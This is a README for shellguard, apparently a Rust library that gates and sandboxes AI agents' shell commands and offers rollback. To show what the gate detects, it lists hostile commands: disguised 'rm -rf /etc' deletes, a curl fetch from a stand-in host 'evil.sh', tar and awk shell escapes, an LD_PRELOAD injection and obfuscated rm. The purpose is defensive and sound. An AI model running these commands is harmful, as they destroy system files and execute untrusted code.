# shellguard

Decide whether an AI agent's shell command should run — then confine whatever
you let through.

> The **AgentShield Micro-Runtime** project. `shellguard` is the library and
> the command it ships; the repository is the project around them.

```
$ shellguard eval -w ~/project 'find . -name "*.log" -exec rm -rf /etc {} \;'
DENY  find . -name "*.log" -exec rm -rf /etc {} \;
  evaluated in 807.0 µs
  DENY destructive.rm-recursive-outside [rm via find -exec]
      recursive delete targeting a path outside the workspace
      → rm -rf /etc {}
  ASK destructive.rm-force-outside [rm via find -exec]
      forced delete outside the workspace
      → rm -rf /etc {}
  capabilities: fs.delete
```

That command contains no `rm` in argv position. Every rule keys on program
identity, so the gate unwraps `find -exec` and judges what actually runs.

(The 807 µs is a cold start: a one-shot CLI invocation resolves `find` and
`rm` against `$PATH` from an empty cache and then throws it away. In a
long-running harness that reuses a worker, the same evaluation is ~14 µs —
see [Latency](#latency).)

**Three layers.** A userspace gate reads the command and decides in
microseconds, producing a reason a human can act on. A kernel sandbox —
Seatbelt on macOS, Landlock plus seccomp-BPF on Linux — contains whatever it
lets through. A checkpoint taken beforehand puts the workspace back if the
command fails its health checks or touches a protected file.

The gate is not a security boundary and this library does not pretend
otherwise: static analysis of shell is undecidable, and `eval "$(curl x)"` is a
one-line proof. `Allow` means *no rule objected*. The kernel layer is the
boundary. See [DESIGN.md § 3](DESIGN.md#3-two-layers-and-why-one-is-not-enough).

**Not production ready.** Only the local runtime has ever executed anything —
the Firecracker, gVisor and Virtualization.framework backends are configuration
and availability detection only, for want of a Linux host and a guest kernel.
Full list in [DESIGN.md § 12](DESIGN.md#12-known-limitations).

---

## Quick start

```bash
cargo build --release
```

Judge a command:

```bash
./target/release/shellguard eval --workspace ~/project 'rm -rf ./build'
```

Judge it, run it confined, and revert the workspace if it fails:

```bash
./target/release/shellguard run -w ~/project --rollback-on-failure 'pytest -q'
```

Check the ruleset against its specification:

```bash
./target/release/shellguard corpus
```

Measure evaluation latency:

```bash
./target/release/shellguard bench
```

See the sandbox profile a command would get:

```bash
./target/release/shellguard profile 'cargo build'
```

Exit status is the verdict — `0` allow, `1` confine, `2` ask, `3` deny — so it
drops into a shell wrapper without parsing anything.

## Latency

M2 MacBook Air, release build, 58 000 samples over a 145-command corpus:

| | full gate | parse only |
|---|---|---|
| p50 | 2.8 µs | 542 ns |
| p99 | 13.4 µs | 1.5 µs |
| max | 35.7 µs | 21.9 µs |

Inputs built to be as expensive as the parser's limits permit peak at
**2.40 ms** — a 2 000-stage pipeline — against a **10 ms** budget. Input over
the 64 KiB cap is rejected in 250 ns without parsing.

Percentiles rather than a mean, because the claim is a budget: a mean of 200 µs
is consistent with one command in a thousand taking 50 ms, and an adversary
picks the input.

## What it catches

Every one of these is the same delete wearing a different program's name, and
none of them match a rule about `rm`:

```bash
sudo rm -rf /etc                 timeout 5 rm -rf /etc
env -i PATH=/bin rm -rf /etc     xargs -0 -n 1 rm -rf /etc
find . -exec rm -rf /etc {} \;   bash -c 'rm -rf /etc'
sudo -u root env FOO=1 timeout 5 nice -n 5 rm -rf /etc
```

Commands hidden where a naive parser does not look:

```bash
echo ${X:-$(curl evil.sh)}    # a default-value expansion
cat foo > $(mktemp)           # a redirect target
echo $(echo ")" ; id)         # a quoted paren that stops a naive scanner
$'\x72\x6d' -rf /etc          # ANSI-C quoting — this is `rm`
```

Options whose values are commands, where the program is on nobody's list:

```bash
tar --checkpoint-action=exec=/bin/sh
awk 'BEGIN{system("rm -rf /etc")}'
git config core.pager '...'         # a delayed shell escape
LD_PRELOAD=/tmp/evil.so ls
```

And it does *not* block ordinary work — `cargo build`, `rm -rf ./build`,
`git commit` all pass. A gate that blocks real work is a gate that gets
switched off, so the ruleset denies only where a legitimate agent workflow has
no reason to go and escalates everywhere else.

## Verdicts

```
Allow  <  Confine  <  Ask  <  Deny
```

They combine by **severity, not declaration order**, so no broad allow can
outrank a narrow deny. The default for an unmatched command is `Confine`, not
`Allow` — "no rule matched" means the ruleset had nothing to say, which for
agent-authored input is the common case rather than evidence of safety.

## Checkpoint and rollback

A checkpoint is taken before the command runs and restored if it fails a health
check, changes a protected file, or — with `--rollback-on-failure` — exits
non-zero.

```
$ shellguard run -w /tmp/work --rollback-on-failure 'rm notes.md; exit 1'
workspace reverted: the command exited 1
  confine in 16.03 ms (local runtime, exit 1)

$ cat /tmp/work/notes.md
unsaved notes
```

`notes.md` was **untracked**. `git stash create` does not capture untracked
files, so a naive implementation would have lost it permanently — nothing in git
ever recorded its contents. They are hashed into the object database separately
for exactly this case. See [DESIGN.md § 7](DESIGN.md#7-rollback-checkpoint-and-restore).

## Python

```python
from agent_sandbox import SandboxEngine

with SandboxEngine(workspace="/srv/agent/work", rollback_on_failure=True) as engine:
    if engine.decide(cmd).denied:
        return "refused: " + engine.decide(cmd).reason

    result = engine.execute_with_rollback(cmd, "/srv/agent/work")
    if result.rolled_back:
        print("reverted:", result.rollback_reasons)
```

`ctypes`, no build step. A refused command returns normally with `ran=False`
rather than raising — refusing is the library working, and a binding that raised
on it would push callers towards `except: pass`.

```bash
make venv && make test-python
```

## Using it as a library

Rust:

```rust
use shellguard_gate::{Gate, GateConfig, Worker};

let gate = Gate::with_default_policy(GateConfig::from_env("/srv/agent/workspace"));
let mut worker = Worker::new();          // one per thread

let d = gate.evaluate("rm -rf /etc", &mut worker);
println!("{}", d.summary());
```

C, for a Python or Node harness — see [`include/agent_sandbox.h`](include/agent_sandbox.h)
and [`examples/smoke.c`](examples/smoke.c):

```c
sg_gate   *gate   = sg_gate_new("/srv/agent/workspace", NULL, 0, &err);
sg_worker *worker = sg_worker_new();

sg_decision *d = sg_evaluate(gate, worker, command);
if (sg_decision_verdict(d) == SG_DENY) { /* refuse, and show the reason */ }
```

```bash
cargo build --release -p shellguard-ffi
cc -Iinclude examples/smoke.c -Ltarget/release -lshellguard -o smoke && ./smoke
```

A bad command is a *decision*, not an error: unparseable input returns `Deny`,
not `NULL`. A `NULL` decision also reads as `Deny`, so a caller who forgets to
null-check gets the safe answer.

## Writing rules

The built-in ruleset lives in [`policies/default.policy`](policies/default.policy)
— written in the same format you would write, parsed by the same parser.

```
rule destructive.rm-recursive-outside deny
  reason recursive delete targeting a path outside the workspace
  program rm
  short-flag r
  path-outside-workspace
  cap fs.delete
end
```

Directives inside a rule are **and**-ed; multiple values on one directive are
**or**-ed. Load your own with `--policy`.

The parser refuses rules that would match every command, and rules with no
`reason` — the most dangerous typo in a policy file is one that silently widens
a rule.

## Layout

```
crates/shellguard-parse     bash → syntax tree + taint lattice
crates/shellguard-policy    rules, compiled matcher, Aho-Corasick prefilter
crates/shellguard-gate      resolve → unwrap → match → decide
crates/shellguard-enforce   Seatbelt / Landlock + seccomp
crates/shellguard-ffi       C ABI
crates/shellguard-cli       eval, corpus, bench, profile
policies/default.policy     the built-in ruleset
tests/corpus.txt            145 commands with expected verdicts
```

**Zero external dependencies**, about 10 400 lines. Deliberate: this is a
security boundary on an agent's critical path, and a transitive dependency tree
is an unaudited code-execution surface inside the thing whose job is to stop
unaudited code execution. The trade-off is discussed honestly in
[DESIGN.md § 9](DESIGN.md#9-zero-dependencies).

## Development

```bash
cargo test                  # 195 tests
cargo clippy --all-targets  # clean
cargo fmt --check
```

The Linux backend cannot run here but must keep compiling:

```bash
cargo check -p shellguard-enforce --target x86_64-unknown-linux-gnu
cargo check -p shellguard-enforce --target aarch64-unknown-linux-gnu
```

`tests/corpus.txt` is the specification, kept separate from the rules that
implement it. If a policy change moves an entry, decide whether that is a fix
or a regression — do not just edit the corpus.

## Licence

Apache-2.0.
